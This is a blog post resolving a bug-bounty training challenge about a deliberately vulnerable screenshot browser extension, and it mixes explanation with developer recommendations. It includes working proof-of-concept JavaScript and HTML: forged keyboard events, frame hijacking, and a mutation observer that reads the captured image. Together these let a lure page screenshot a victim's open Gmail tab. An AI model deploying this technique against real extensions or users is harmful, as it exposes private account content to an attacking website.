{"title": "BBN challenge resolution: Exploiting the Screenshotter.PRO browser extension", "date": "2018-12-10 13:03:23", "description": "\"Try out my Screenshotter.PRO browser extension\" challenge was inspired by Firefox Screenshots. Answer revealed here.", "categories": ["security", "challenge"], "slug": "bbn-challenge-resolution-exploiting-the-screenshotterpro-browser-extension"}

<p>The time has come to reveal the answer to my next BugBountyNotes challenge called <a href="https://www.bugbountynotes.com/challenge?id=17">Try out my Screenshotter.PRO browser extension</a>. This challenge is a browser extension supposedly written by a naive developer for the purpose of taking webpage screenshots. While the extension is functional, the developer discovered that some websites are able to take a peek into their Gmail account. How does that work?</p>

<p>If you haven&#8217;t looked at this challenge yet, feel free to stop reading at this point and go try it out. Mind you, this one is hard and only two people managed to solve it so far. Note also that I won&#8217;t look at any answers submitted at this point any more. Of course, you can also participate in any of the <a href="https://www.bugbountynotes.com/training">ongoing challenges</a> as well.</p>

<p>Still here? Ok, I&#8217;m going to explain this challenge then.</p>

<h4>Taking control of the extension UI</h4>

<p>This challenge has been inspired by the <a href="https://palant.de/2017/11/11/on-web-extensions-shortcomings-and-their-impact-on-add-on-security">vulnerabilities I discovered around the Firefox Screenshots feature</a>. Firefox Screenshots is essentially a built-in browser extension in Firefox, and while it takes care to isolate its user interface in a frame protected by the same-origin policy, I discovered a race condition that allowed websites to change that frame into something they can access.</p>

<p>This race condition could not be reproduced in the challenge because the approach used works in Firefox only. So the challenge uses a different approach to protect its frame from unwanted access: it creates a frame pointing to https://example.com/ (the website cannot access it due to same-origin policy), then injects its user interface into this frame via a separate content script. And since a content script can only be injected into all frames of a tab, the content script uses the (random) frame name to distinguish the “correct” frame.</p>

<p>And here lies the issue of course. While the webpage cannot predict what the frame name will be, it can see the frame being injected and change the <code>src</code> attribute into something else. It can load a page from the same server, then it will be able to access the injected extension UI. A submission I received for this challenge solved this even more elegantly: by assigning <code>window.name = frame.name</code> it made sure that the extension UI was injected directly into their webpage!</p>

<p>Now the only issue is bringing up the extension UI. With Firefox Screenshots I had to rely on the user clicking “Take a screenshot.” The extension in the challenge allowed triggering its functionality via a hotkey however. And, like so often, it failed checking for <a href="https://developer.mozilla.org/en-US/docs/Web/API/Event/isTrusted">event.isTrusted</a>, so it would accept events generated by the webpage. Since the extension handles events synchronously, the following code is sufficient here:</p>

<pre><code>window.dispatchEvent(new KeyboardEvent(&quot;keydown&quot;, {
  key: &quot;S&quot;,
  ctrlKey: true,
  shiftKey: true
}));
let frame = document.getElementsByTagName(&quot;iframe&quot;)[0];
frame.src = &quot;blank.html&quot;;</code></pre>

<p><em>Recommendation for developers</em>: Any content which you inject into websites should always be contained inside a frame that is part of your extension. This at least makes sure that the website cannot access the frame contents, but you still have to worry about clickjacking and spoofing attacks.</p>

<p>Also, if you ever attach event listeners to website content, always make sure that <code>event.isTrusted</code> is <code>true</code>, so it&#8217;s a real event rather than the website playing tricks on you.</p>

<h4>What to screenshot?</h4>

<p>Once the webpage can access the extension UI, clicking the “Screenshot to clipboard” button programmatically is trivial. Again <code>Event.isTrusted</code> is not being checked here. However, even though Firefox Screenshots only accepted trusted events, it didn&#8217;t help it much. At this point the webpage can make the button transparent and huge, so when the user clicks somewhere the button is always triggered.</p>

<p>The webpage can create a screenshot, but what&#8217;s the deal? With Firefox Screenshots I only realized it after creating the bug report, the big issue here is that the webpage can screenshot third-party pages. Just load some page in a frame and it will be part of the screenshot even though you normally cannot access its contents. Only trouble: really critical sites such as Gmail don&#8217;t allow being loaded in a frame these days.</p>

<p>Luckily, this challenge had to be compatible with Chrome. And while Firefox extensions can use <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/captureTab">tabs.captureTab method</a> to capture a specific tab, there is nothing comparable for Chrome. The solution that the hypothetical extension author took was using <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/captureVisibleTab">tabs.captureVisibleTab method</a> which works in any browser. Side-effect: the visible tab isn&#8217;t necessarily the tab where the screenshotting UI lives.</p>

<p>So the attacks starts by asking the user to click a button. When clicked, that button opens Gmail in a new tab. The original page stays in background and initiates screenshotting. When the screenshot is done it will contain Gmail, not the attacking website.</p>

<h4>How to get the screenshot?</h4>

<p>The last step is getting the screenshot which is being copied to clipboard. Here, a Firefox bug makes things a lot easier for attackers. Until very recently, the only way to copy something to clipboard was <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Interact_with_the_clipboard#Using_execCommand()">calling document.execCommand() on a text field</a>. And Firefox doesn&#8217;t allow this action to be performed on the extension&#8217;s background page, so extensions will often resort to doing it in the context of web pages that they don&#8217;t control.</p>

<p>The most straight-forward solution is registering a <code>copy</code> event listener on the page, it will be triggered when the extension attempts to copy to the clipboard. That&#8217;s how I did it with Firefox Screenshots, and one of the submitted answers also uses this approach. But I actually forgot about it when I created my own solution for this challenge, so I used mutation observers to see when a text field is inserted into the page and read out its value (the actual screenshot <span class="caps">URL</span>):</p>

<pre><code>let observer = new MutationObserver(mutationList =&gt;
{
  for (let mutation of mutationList)
  {
    if (mutation.addedNodes &amp;&amp; mutation.addedNodes[0].localName == &quot;textarea&quot;)
      document.body.innerHTML = `&lt;p&gt;Here is what Gmail looks like for you:&lt;/p&gt;&lt;img src=&quot;${mutation.addedNodes[0].value}&quot;&gt;`;
  }
});
observer.observe(document.body, {childList: true});</code></pre>

<p>I hope that the new <a href="https://developer.mozilla.org/en-US/docs/Web/API/Clipboard_API">Clipboard <span class="caps">API</span></a> finally makes things sane here, so it isn&#8217;t merely more elegant but also gets rid of this huge footgun. But I didn&#8217;t have any chance to play with it yet, this <span class="caps">API</span> only being available since Chrome 66 and Firefox 63. So the recommendation is still: make sure to run any clipboard operations in a context that you control. If the background page doesn&#8217;t work, use a tab or frame belonging to your extension.</p>

<h4>The complete solution</h4>

<p>That&#8217;s pretty much it, everything else is only about visuals and timing. The attacking website needs to hide the extension UI so that the user doesn&#8217;t suspect anything. It also has no way of knowing when Gmail finishes loading, so it has to wait some arbitrary time. Here is what I got altogether. It is one way to solve this challenge but certainly not the only one.</p>

<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;title&gt;Screenshotter.PRO browser extension (solution)&lt;/title&gt;
    &lt;script&gt;
      function runAttack()
      {
        let targetWnd = window.open(&quot;https://gmail.com/&quot;, &quot;_blank&quot;);

        window.dispatchEvent(new KeyboardEvent(&quot;keydown&quot;, {
          key: &quot;S&quot;,
          ctrlKey: true,
          shiftKey: true
        }));

        let frame = document.getElementsByTagName(&quot;iframe&quot;)[0];
        frame.src = &quot;blank.html&quot;;
        frame.style.visibility = &quot;hidden&quot;;
        frame.addEventListener(&quot;load&quot;, () =&gt;
        {
          // Leave some time for gmail.com to load
          window.setTimeout(function()
          {
            frame.contentDocument.getElementById(&quot;do_screenshot&quot;).click();

            let observer = new MutationObserver(mutationList =&gt;
            {
              for (let mutation of mutationList)
              {
                if (mutation.addedNodes &amp;&amp; mutation.addedNodes[0].localName == &quot;textarea&quot;)
                {
                  targetWnd.close();
                  document.body.innerHTML = `&lt;p&gt;Here is what Gmail looks like for you:&lt;/p&gt;&lt;img src=&quot;${mutation.addedNodes[0].value}&quot;&gt;`;
                }
              }
            });
            observer.observe(document.body, {childList: true});
          }, 2000);
        });
      }
    &lt;/script&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;button onclick=&quot;runAttack();&quot;&gt;Click here for a surprise!&lt;/button&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>